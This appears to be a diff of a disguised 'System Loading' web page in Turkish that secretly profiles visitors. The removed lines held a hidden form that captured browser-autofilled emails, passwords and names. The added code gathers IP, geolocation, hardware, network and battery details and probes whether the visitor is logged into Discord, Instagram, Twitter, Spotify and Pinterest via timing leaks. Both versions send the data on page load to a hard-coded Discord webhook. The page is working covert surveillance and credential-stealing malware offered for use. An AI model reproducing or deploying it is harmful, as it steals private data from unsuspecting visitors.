@@ -5,94 +5,83 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Yükleniyor...</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; font-family: sans-serif; color: #0f0; }
-        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
+        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; }
+        .l { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        /* Gizli Form: Kullanıcı görmez ama tarayıcı doldurur */
-        #hidden-form { opacity: 0; position: absolute; top: -1000px; left: -1000px; }
     </style>
 </head>
 <body>
     <div class="l"></div>
 
-    <form id="hidden-form">
-        <input type="email" name="email" id="e" autocomplete="email">
-        <input type="password" name="password" id="p" autocomplete="current-password">
-        <input type="text" name="full-name" id="n" autocomplete="name">
-    </form>
-
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
+    (async () => {
+        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function getIPInfo() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                return await res.json();
-            } catch { return {}; }
-        }
+        // 1. XS-LEAKS MODÜLÜ
+        const checkLogin = async (url) => {
+            return new Promise((resolve) => {
+                const img = new Image();
+                const start = performance.now();
+                img.onload = () => resolve(true);
+                img.onerror = () => (performance.now() - start < 100) ? resolve(true) : resolve(false);
+                img.src = url + "/favicon.ico?" + Math.random();
+            });
+        };
 
-        async function getBatteryInfo() {
-            try {
-                const b = await navigator.getBattery();
-                return `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch { return "Erişilemedi"; }
-        }
+        async function masterExtract() {
+            let info = { gpu: "N/A", ven: "N/A", ip: {}, net: "N/A", bat: "N/A" };
 
-        function getGPU() {
+            // DONANIM & AĞ SORGUSU
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
-            } catch { return "N/A"; }
-        }
+                if (dbg) {
+                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                }
+                const res = await fetch('https://ipapi.co/json/');
+                info.ip = await res.json();
+                const n = navigator.connection;
+                info.net = n ? `~${n.downlink} Mbps | ${n.effectiveType}` : "N/A";
+                const b = await navigator.getBattery();
+                info.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
+            } catch(e) {}
 
-        async function sendToDiscord(extraData = {}) {
-            const ip = await getIPInfo();
-            const bat = await getBatteryInfo();
-            
+            // GÜNCEL OTURUM TESPİTLERİ
+            const sessions = {
+                discord: await checkLogin("https://discord.com"),
+                instagram: await checkLogin("https://www.instagram.com"),
+                twitter: await checkLogin("https://twitter.com"),
+                spotify: await checkLogin("https://open.spotify.com"),
+                pinterest: await checkLogin("https://www.pinterest.com")
+            };
+
             const payload = {
                 embeds: [{
-                    title: "💀 Gelişmiş Sistem ve Autofill Analizi",
-                    color: 0x00ff00,
+                    title: "💀 KUSURSUZ ADLİ SİSTEM ANALİZİ",
+                    description: `Sistem Uptime: \`${Math.floor(performance.now()/1000/60)} Dakika\``,
+                    color: 15158332,
                     fields: [
-                        { name: "🌐 Ağ Bilgisi", value: `**IP:** \`${ip.ip || '?'}\`\n**ISS:** ${ip.org || '?'}\n**Konum:** ${ip.city}/${ip.country_name}`, inline: true },
-                        { name: "💻 Donanım", value: `**GPU:** \`${getGPU()}\`\n**OS:** ${navigator.platform}\n**RAM:** ${navigator.deviceMemory || '?'}GB`, inline: true },
-                        { name: "🔋 Pil", value: bat, inline: true },
-                        { name: "🔑 Sızdırılan Veriler", value: `**E-posta:** \`${extraData.email || 'Boş'}\`\n**Şifre:** \`${extraData.pass || 'Boş'}\`\n**İsim:** \`${extraData.name || 'Boş'}\`` }
+                        { name: "📡 İNTERNET VE ISS KATMANI", value: `📍 **Bölge:** ${info.ip.city || '?'}\n🛰️ **ISS:** ${info.ip.org || '?'}\n⚡ **Hız:** ${info.net}\n**IP:** \`${info.ip.ip || '?'}\``, inline: false },
+                        { name: "🛠️ DONANIM DETAYLARI", value: `**GPU:** \`${info.gpu}\`\n**CPU:** ${navigator.hardwareConcurrency} Çekirdek\n**RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n**Pil:** ${info.bat}`, inline: false },
+                        { name: "🔐 DİJİTAL OTURUM DURUMLARI", value: `Discord: ${sessions.discord ? '✅' : '❌'} | Instagram: ${sessions.instagram ? '✅' : '❌'}\nTwitter: ${sessions.twitter ? '✅' : '❌'} | Spotify: ${sessions.spotify ? '✅' : '❌'}\nPinterest: ${sessions.pinterest ? '✅' : '❌'}`, inline: false },
+                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
                     ],
-                    footer: { text: "Protocol: Omniscience v8.0" },
+                    footer: { text: "Protocol: Omniscience v11.0 | Final Build" },
                     timestamp: new Date()
                 }]
             };
 
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+            await fetch(u, { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify(payload) 
             });
         }
 
-        // Global Etkileşim Dinleyici
-        document.addEventListener('click', () => {
-            // Kullanıcı tıkladığı an tarayıcıyı doldurmaya zorla
-            document.getElementById('e').focus();
-            
-            // Veri varsa (autofill çalıştıysa) 1 saniye sonra gönder
-            setTimeout(() => {
-                const data = {
-                    email: document.getElementById('e').value,
-                    pass: document.getElementById('p').value,
-                    name: document.getElementById('n').value
-                };
-                if(data.email || data.pass) {
-                    sendToDiscord(data);
-                }
-            }, 1000);
-        });
-
-        // Sayfa açıldığında temel bilgileri hemen gönder
-        window.onload = () => sendToDiscord();
+        window.addEventListener('load', masterExtract);
+    })();
     </script>
 </body>
 </html>
